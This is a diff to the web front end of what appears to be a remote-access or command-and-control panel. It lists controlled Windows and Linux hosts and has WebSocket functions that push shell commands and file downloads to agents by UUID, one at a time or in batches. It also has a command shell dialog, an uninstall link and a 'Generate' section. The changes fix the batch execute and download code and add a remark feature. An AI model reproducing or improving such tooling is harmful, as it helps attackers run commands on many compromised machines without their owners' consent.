@@ -109,7 +109,7 @@
                 console.log("batch download:", temp[i])
                 ws.send(JSON.stringify(
                     {
-                        "uuid": temp[i].value,
+                        "uuid": temp[i],
                         "do": {
                             "do": "download",
                             "data": b64
@@ -118,7 +118,7 @@
                 ))
             }
 
-            $("#d_res").html("发送成功");
+            $("#batch_download_result").html("发送成功");
         }
 
         function batch_execute_btu_on() {
@@ -132,6 +132,7 @@
             let lists = document.getElementsByName("category");
             if ($("#batch_download_os").val() === "windows") {
                 for (let i = 0; i < lists.length; i++) {
+
                     if ($("#" + lists[i].value + " td")[3].innerText === "windows") {
                         temp.push(lists[i].value)
                     }
@@ -150,15 +151,17 @@
                 }
             }
             for (let i = 0; i < temp.length; i++) {
+                console.log("batch execute",temp[i])
                 ws.send(JSON.stringify(
                     {
-                        "uuid": temp[i].value,
+                        "uuid": temp[i],
                         "do": {
                             "do": "cmd",
                             "data": b64
                         }
                     }
                 ))
+                $("#batch_cmd_result").html("发送成功")
             }
         }
     </script>
@@ -217,10 +220,10 @@
                             <td>127.1.1.1</td>
                             <td>测试机器1</td>
                             <td>windows</td>
-                            <td>administrator</td>
-                            <td>loop</td>
+                            <td>WINPC-SDASD123/administrator</td>
+                            <td>Loop</td>
                             <td>192.168.0.7</td>
-                            <td><a href="#">终端</a> <a href="#">下载</a> <a href="#">卸载</a></td>
+                            <td><a href="#">终端</a> <a href="#">下载</a> <a href="#">备注</a> <a href="#">卸载</a></td>
                         </tr>
                         <tr id="s2">
                             <td><label>
@@ -229,10 +232,10 @@
                             <td>127.1.1.2</td>
                             <td>测试机器1</td>
                             <td>linux</td>
-                            <td>administrator</td>
-                            <td>loop</td>
+                            <td>www-data</td>
+                            <td>Loop</td>
                             <td>192.168.0.7</td>
-                            <td><a href="#">终端</a> <a href="#">下载</a> <a href="#">卸载</a></td>
+                            <td><a href="#">终端</a> <a href="#">下载</a> <a href="#">备注</a> <a href="#">卸载</a></td>
                         </tr>
         </table>
     </div>
@@ -254,7 +257,7 @@
 <div id="light" class="white_content">Cmd Shell
 
     <a href="javascript:void(0)" onclick="cmd_close();" style="text-align: right;">关闭</a>
-
+    <br>
     <p id="IP">目前控制的是：</p>
     <div style="text-align: center;" id="cmdcommand" class="tab-pane fade in active">
         <label>
@@ -266,6 +269,15 @@
             <button id="cmd_execute" aligh="right" onclick="cmd_execute()">execute</button>
         </label>
     </div>
+</div>
+<div id="remark" class="white_content">Remark
+
+    <a href="javascript:void(0)" onclick="cmd_close();" style="text-align: right;">关闭</a>
+    <br>
+    备注：<input id="remark_input" type="text">
+
+    <button id="remark_btu" aligh="right" onclick="remark_btu_on()">修改</button>
+    <p id="remark_result"></p>
 </div>
 
 <div id="download" class="white_content">Web Download
@@ -310,11 +322,11 @@
     </select>
     <br>
     <button id="batch_cmd_button" aligh="right" onclick="batch_down_btu_on()">下载</button>
-
+    <p id="batch_download_result"></p>
 
 </div>
 
-<div id="batch_cmd" class="white_content">Batch Download
+<div id="batch_cmd" class="white_content">Batch Execute
     <a href="javascript:void(0)" onclick="batch_cmd_close();">关闭</a>
     <input id="batch_cmd_input" type="text" class="form-control" style="width: 95%">
     <input id="batch_cmd_param" type="text" class="form-control" style="width: 95%">
@@ -326,7 +338,7 @@
     </select>
     <br>
     <button id="batch_download_button" aligh="right" onclick="batch_execute_btu_on()">运行</button>
-
+    <p id="batch_cmd_result"></p>
 </div>
 
 <div id="generate" class="white_content">Generate
